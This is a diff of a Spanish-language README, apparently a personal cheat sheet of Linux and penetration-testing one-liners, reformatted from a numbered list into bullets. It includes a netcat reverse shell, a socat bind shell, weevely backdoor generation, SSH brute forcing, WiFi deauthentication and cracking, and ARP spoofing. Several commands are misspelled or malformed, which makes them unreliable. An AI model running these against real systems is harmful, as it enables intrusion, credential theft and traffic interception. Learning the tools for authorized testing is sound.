@@ -1,4 +1,4 @@
-# C-digo-b-sico
+# C0digo-b4sico
 # 01. Código de comandos básicos para Linux:
    
 * `pwd` - Directorio actual
@@ -19,115 +19,115 @@
 
 # 02. Comandos de información del sistema:
 
-16. uname -a - Muestra información del sistema
-17. whoami - Muestra el usuario actual
-18. id - Muestra el ID del usuario y del grupo
-19. uptime - Muestra la cantidad de tiempo del sistema está operativo
-20. df -h - Muestra el uso del disco
-21. du -sh <carpeta> - Muestra el tamaño de una carpeta
-22. top - Muestra procesos activos
-23. ps aux - Lista los procesos que se están ejecutando
-24. kill <proceso> - Termina un proceso
-25. htop - Gestion de procesos interactivos
+* `uname -a` - Muestra información del sistema
+* `whoami` - Muestra el usuario actual
+* `id `- Muestra el ID del usuario y del grupo
+* `ptime` - Muestra la cantidad de tiempo del sistema está operativo
+* `df -h` - Muestra el uso del disco
+* `du -sh` <carpeta> - Muestra el tamaño de una carpeta
+* `top` - Muestra procesos activos
+* `ps aux` - Lista los procesos que se están ejecutando
+* `kill <ID proceso>` - Termina un proceso
+* `htop` - Gestion de procesos interactivos
 
 # 03. Uso de comandos de gestión:
 
-26. adduser <usuario> - Añade un nuevo usuario
-27. deluser <usuario> - Elimina un usuario
-28. passwd <usuario> - Cambia la contraseña
-29. usermod -aG sudo <usuario> - Da acceso de superusuario
-30. groups <usuario> -Muestra los grupos del usuario
-31. chmod 777 <archivo> - Cambia los permisos del archivo
-32. chown usuario:grupo <archivo> - Cambia el dueño del archivo
+* `adduser <usuario>` - Añade un nuevo usuario
+* `deluser <usuario>` - Elimina un usuario
+* `passwd <usuario>` - Cambia la contraseña
+* `usermod -aG sudo <usuario>` - Da acceso de superusuario
+* `groups <usuario>` - Muestra los grupos del usuario
+* `chmod 777 <archivo>` - Cambia los permisos del archivo
+* `chown usuario:grupo <archivo>` - Cambia el dueño del archivo
 
 # 04. Comandos en redes:
 
-33. ifconfig - Muestra la interfaz de la red
-34. ip a - Muestra la dirección IP
-35. iwconfig - Muestra la interfaz wifi
-36. ping <IP> - Test de conexión IP
-37. netstat -tulnp - Muestra los puertos abiertos
-38. nmap <IP> - Escanea los puertos abierto del objetivo
-39. traceroute <IP> - Traza una ruta a un host
-40. curl <URL> - Busca datos de una URL
-41. wget <URL> - Descarga un archivo
-42. dig <dominio> - Obtiene infomacion DNS
-43. nslookup <dominio> - Realiza una busqueda de DNS
+* `ifconfig` - Muestra la interfaz de la red
+* `ip a` - Muestra la dirección IP
+* `iwconfig` - Muestra la interfaz wifi
+* `ping <IP>` - Test de conexión IP
+* `netstat -tulnp` - Muestra los puertos abiertos
+* `nmap <IP>` - Escanea los puertos abierto del objetivo
+* `traceroute <IP>` - Traza una ruta a un host
+* `curl <URL>` - Busca datos de una URL
+* `wget <URL>` - Descarga un archivo
+* `dig <dominio>` - Obtiene infomacion DNS
+* `nslookup <dominio>` - Realiza una busqueda de DNS
 
 # 05. Comandos de Hacking & Test de Penetración:
 
-44. msfconsole - Inicia Mestasploit
-45. msfvenom - Genera cargas útiles (payloads)
-46. searchsploit <exploit> - Busca exploits
-47. sqlmap -u <URL> --dbs - Test de SQL injection
-48. hydra -l user -P pass.txt <IP> shh - SSH de fuerza bruta
-49. john --wordlist=rockyou.txt hash.txt - Crackea hashes
-50. airmon-ng start wlan0 - Permite modo monitorización
-51. airdump-ng wlan0mon - Captura paquetes wifi
-52. airplay-ng -0 10 -a <BSSID> wlan0mon - Desautentica clientes
-53. aircrack-ng -w rockyou.txt -b <BSSID> <archivo_capturado> - Crackea contraseña WIFI
-54. hashcat -m 2500 hash.txt rockyou.txt - Cracka hashes usando GPU
-55. ettercap -T -q -i eth0 - Realiza una suplantación de ARP
-56. driftnet -i eth0 - Captura imágenes del trafico de red
-57. tcpdump -i eth0 - Captura paquetes de red
-58. tshark -i eth0 - Analisis del trafico de red
-59. nikto -h <URL> - Escanea nulnerabilidades de servidores web
-60. gobuster dir -u <URL> -w /urs/share/wordlists/dirb/common.txt - Fuerza bruta de la carpeta
-61. wpscan --url <URL> - Escanea vulnerabilidades en WordPress
+* `msfconsole` - Inicia Mestasploit
+* `msfvenom` - Genera cargas útiles (payloads)
+* `searchsploit <exploit>` - Busca exploits
+* `sqlmap -u <URL> --dbs` - Test de SQL injection
+* `hydra -l user -P pass.txt <IP> shh` - SSH de fuerza bruta
+* `john --wordlist=rockyou.txt hash.txt` - Crackea hashes
+* `airmon-ng start wlan0` - Permite modo monitorización
+* `airdump-ng wlan0mon` - Captura paquetes wifi
+* `airplay-ng -0 10 -a <BSSID> wlan0mon` - Desautentica clientes
+* `aircrack-ng -w rockyou.txt -b <BSSID> <archivo_capturado>` - Crackea contraseña WIFI
+* `hashcat -m 2500 hash.txt rockyou.txt` - Cracka hashes usando GPU
+* `ettercap -T -q -i eth0` - Realiza una suplantación de ARP
+* `driftnet -i eth0` - Captura imágenes del trafico de red
+* `tcpdump -i eth0` - Captura paquetes de red
+* `tshark -i eth0` - Analisis del trafico de red
+* `nikto -h <URL>` - Escanea nulnerabilidades de servidores web
+* `gobuster dir -u <URL> -w /urs/share/wordlists/dirb/common.txt` - Fuerza bruta de la carpeta
+* `wpscan --url <URL>` - Escanea vulnerabilidades en WordPress
 
 #06. Escalada de Privilegios & Post-Explotaciones:
 
-62. sudo -l - Muestr los privilegios de superusuario
-63. sudo su - Cambia a usuario root
-64. python -c 'import pty:pty.spawn("/bin/bash/")' - Habilita el shell/terminal
-65. nc -lvnp <puerto> - Empieza un Netcat de escucha
-66. nc <IP> <puerto> -e /bin/bash - Shell inverso
-67. meterpreter> getuid - Muestra el usuario actual en Meterpreter
-68. meterpreter> getsystem - Intenta escalar privilegios
-69. meterpreter> upload / download <archivo> - Transfiere archivos
-70. merterpreter> shell - Obterner shell/terminal del sistema
-71. linux-exploit-suggester - Sugiere exploits para escalada de privilegios
+* `sudo -l` - Muestr los privilegios de superusuario
+* `sudo su` - Cambia a usuario root
+* `python -c 'import pty:pty.spawn("/bin/bash/")'` - Habilita el shell/terminal
+* `nc -lvnp <puerto>` - Empieza un Netcat de escucha
+* `nc <IP> <puerto> -e /bin/bash` - Shell inverso
+* `meterpreter> getuid` - Muestra el usuario actual en Meterpreter
+* `meterpreter> getsystem` - Intenta escalar privilegios
+* `meterpreter> upload / download <archivo>` - Transfiere archivos
+* `merterpreter> shell` - Obterner shell/terminal del sistema
+* `linux-exploit-suggester` - Sugiere exploits para escalada de privilegios
 
 # 07. Cifrado de Archivos & Datos:
 
-72. gpg -c <archivo> - Cifra un archivo
-73. gpg -d <archivo.gpg> - Descifra un archivo
-74. openssl enc -aes-256-cbc -salt -in <archivo> -out <archivo.enc> Cifra usando OpenSSL
-75. openssl enc -d -aes-256-cbc -salt -in <archivo.enc> -out <archivo> - Descifra el archivo
+* `gpg -c <archivo>` - Cifra un archivo
+* `gpg -d <archivo.gpg>` - Descifra un archivo
+* `openssl enc -aes-256-cbc -salt -in <archivo> -out <archivo.enc>` -  Cifra usando OpenSSL
+* `openssl enc -d -aes-256-cbc -salt -in <archivo.enc> -out <archivo>` - Descifra el archivo
 
 # 08. Forense & Esteganografía:
 
-76. string <archivo> - Extrae los strigns de un archivo
-77. binwalk <archivo> - Analiza binarios
-78. foremost -i <imagen> - Extrae archivos de una imagen
-79. exiftool <archivo> - Muestra los metadatos de un archivo
-80. stegseek <archivo steg/stegfile> -Detecta datos ocultos en una imagen
+* `string <archivo>` - Extrae los strigns de un archivo
+* `binwalk <archivo>` - Analiza binarios
+* `foremost -i <imagen>` - Extrae archivos de una imagen
+* `exiftool <archivo>` - Muestra los metadatos de un archivo
+* `stegseek <archivo steg/stegfile>` - Detecta datos ocultos en una imagen
 
-09. Cracking de Contraseñas & Hashes:
+# 09. Cracking de Contraseñas & Hashes:
 
-81. hashid <hash> - Identifica el tipo de hash
-82. hydra -L users.txt -P passwords.txt ssh://<IP> - Fuerza bruta SSH
-83. john hash.txt --wordlists=rockyou.txt - Crackea hashes de contraseñas
+* `hashid <hash>` - Identifica el tipo de hash
+* `hydra -L users.txt -P passwords.txt ssh://<IP>` - Fuerza bruta SSH
+* `john hash.txt --wordlists=rockyou.txt` - Crackea hashes de contraseñas
 
-10. Tests de Aplicaciones Web:
+# 10. Tests de Aplicaciones Web:
 
-84. dir <URL> - Enumeracion de carpetas
-85. wfuzz -c -z file,wordlists.txt --hc 404 <URL>/ FUZZ - Web fuzzing
-86. xsssniper -u <URL> - Test para XSS
-87. commix --url <URL> - Test de inyección de comandos
-88. burpsuite - Test con Burp Suite
+* `dir <URL>` - Enumeracion de carpetas
+* `wfuzz -c -z file,wordlists.txt --hc 404 <URL>/FUZZ` - Web fuzzing
+* `xsssniper -u <URL>` - Test para XSS
+* `commix --url <URL>` - Test de inyección de comandos
+* `burpsuite` - Test con Burp Suite
 
 # Varios:
 
-89. crunch 8 8 abcdefghijklmnopqrstuvwxyz - Genera una wordlist
-90. proxychains nmap -sT -Pn <IP> - Usa proxychains con Nmap
-91. tor - Abre navegador Tor
-92. mitmproxy - Empieza un proxy de man-in-the-middle
-93. setoolkit - Comienza una Ingenieria Social con Toolkit
-94. cewl -w words.txt -d 5 <URL> - Genera una lista de palabras personalizadas
-95. weevely generate password backdoor.php - Crea una backdoor en una web
-96. socat TCP-LISTEN:4444,fork EXEC:/bin/bash - Une el shell
-97. whois <domain> - Da información sobre el dominio
-98. theHarvester -d <domain> -l 100 -b google -Recolecta información sobre email y subdominios
-99. fcrackzip -u -D -p rockyou.txt <archivo.zip> - Crackea una contraseña de un archivo .zip
-100. dnscan -d <dominio> - Muestra subdominios
+* `crunch 8 8 abcdefghijklmnopqrstuvwxyz` - Genera una wordlist
+* `proxychains nmap -sT -Pn <IP>` - Usa proxychains con Nmap
+* `tor` - Abre navegador Tor
+* `mitmproxy` - Empieza un proxy de man-in-the-middle
+* `setoolkit` - Comienza una Ingenieria Social con Toolkit
+* `cewl -w words.txt -d 5 <URL>` - Genera una lista de palabras personalizadas
+* `weevely generate password backdoor.php` - Crea una backdoor en una web
+* `socat TCP-LISTEN:4444,fork EXEC:/bin/bash` - Une el shell
+* `whois <dominio>` - Da información sobre el dominio
+* `theHarvester -d <dominio> -l 100 -b google` - Recolecta información sobre email y subdominios
+* `fcrackzip -u -D -p rockyou.txt <archivo.zip>` - Crackea una contraseña de un archivo .zip
+* `dnscan -d <dominio>` - Muestra subdominios
